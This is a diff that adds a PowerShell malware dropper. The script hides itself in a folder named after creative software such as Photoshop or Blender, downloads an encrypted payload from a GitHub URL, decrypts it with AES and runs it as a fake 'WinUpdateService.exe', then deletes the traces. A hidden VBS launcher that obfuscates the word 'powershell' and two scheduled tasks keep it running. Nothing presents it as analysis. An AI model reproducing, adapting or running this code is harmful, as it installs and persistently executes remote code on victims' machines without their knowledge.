@@ -1,0 +1,88 @@
+$programs = @("PhotoshopProAM", "IllustratorXAM", "PremiereEditAM", "AfterEffectsAM", "Blender3DAM", "Maya3DAM", "ZBrushSculptAM", "DaVinciResolveAM", "CorelDrawXAM", "Cinema4DAM", "LightroomXAM")
+$paths = @("$env:AppData\", "C:\ProgramData\")
+$randomProgram = Get-Random -InputObject $programs
+$randomPath = Get-Random -InputObject $paths
+$fullPath = "$randomPath$randomProgram"
+New-Item -Path $fullPath -ItemType Directory -Force
+
+$scriptContent = @'
+function HexStringToByteArray([string]$hex) {
+    $bytes = New-Object byte[] ($hex.Length / 2)
+    for ($i = 0; $i -lt $bytes.Length; $i++) {
+        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
+    }
+    return $bytes
+}
+function AES-Decrypt {
+    param (
+        [byte[]]$Data,
+        [byte[]]$Key,
+        [byte[]]$IV
+    )
+    try {
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key = $Key
+        $aes.IV = $IV
+        $decryptor = $aes.CreateDecryptor()
+        $ms = New-Object System.IO.MemoryStream
+        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+        $cs.Write($Data, 0, $Data.Length)
+        $cs.FlushFinalBlock()
+        $cs.Close()
+        $ms.Close()
+        return $ms.ToArray()
+    }
+    catch {
+        return $null
+    }
+}
+$tempPath = "$env:TEMP\enc_payload.bin"
+Invoke-WebRequest -Uri "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/encrypted_payload.bin" -OutFile $tempPath
+$encBytes = [System.IO.File]::ReadAllBytes($tempPath)
+$keyHex = "00112233445566778899aabbccddeeff"
+$ivHex = "0102030405060708090a0b0c0d0e0f10"
+$key = HexStringToByteArray $keyHex
+$iv = HexStringToByteArray $ivHex
+$decBytes = AES-Decrypt -Data $encBytes -Key $key -IV $iv
+if ($decBytes -ne $null) {
+    $outPath = "C:\ProgramData\WinUpdateService.exe"
+    [System.IO.File]::WriteAllBytes($outPath, $decBytes)
+    if (Test-Path $outPath) {
+        Start-Process $outPath
+        Start-Sleep -Seconds 5
+        Remove-Item $outPath -Force
+    }
+}
+Remove-Item $tempPath -Force
+'@
+
+Set-Content -Path "$fullPath\$randomProgram.ps1" -Value $scriptContent -Force
+
+$vbsContent = @"
+On Error Resume Next
+Dim arr, i, cmd
+arr = Split("p,o,w,e,r,s,h,e,l,l", ",")
+cmd = Join(arr, "") & " -ExecutionPolicy Bypass -NoProfile -File `"$fullPath\$randomProgram.ps1`""
+CreateObject("WScript.Shell").Run cmd, 0, False
+"@
+
+Set-Content -Path "$fullPath\$randomProgram.vbs" -Value $vbsContent -Force
+
+Start-Sleep 2
+try {
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`""
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$randomProgram"
+} catch {}
+
+Start-Sleep 2
+$taskName2 = "${randomProgram}Startup"
+$scriptPath = "`"$fullPath\$randomProgram.vbs`""
+try {
+    schtasks /create /tn "$taskName2" /tr $scriptPath /sc MINUTE /mo 45 /f
+} catch {}
+
+Start-Sleep 5
+schtasks /run /tn "$randomProgram"
